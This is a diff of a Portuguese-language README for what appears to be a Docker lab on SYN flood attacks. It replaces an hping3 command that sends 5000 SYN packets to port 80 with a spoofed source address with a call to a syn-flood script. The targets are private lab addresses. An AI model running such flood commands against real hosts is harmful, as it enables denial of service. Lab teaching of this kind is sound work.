@@ -65,10 +65,10 @@ Execute os seguintes comando:
 docker exec -it client bash
 /home/config.sh
 wget -qO- 172.20.1.2
-hping3 -c 5000 -S -p 80 -i u100 -a 172.20.1.3 172.20.1.2
+/home/syn-flood.sh
 ```
 
-`hping3`: É uma ferramenta de rede capaz de enviar pacotes ICMP/UDP/TCP personalizados e exibir as respostas do alvo.
+`hping3`: É uma ferramenta de rede capaz de enviar pacotes ICMP/UDP/TCP personalizados e exibir as respostas do alvo. E foi utilizada no ataque de SYN Flood.
 
 `-c`: Numero de pacotes enviados.
 
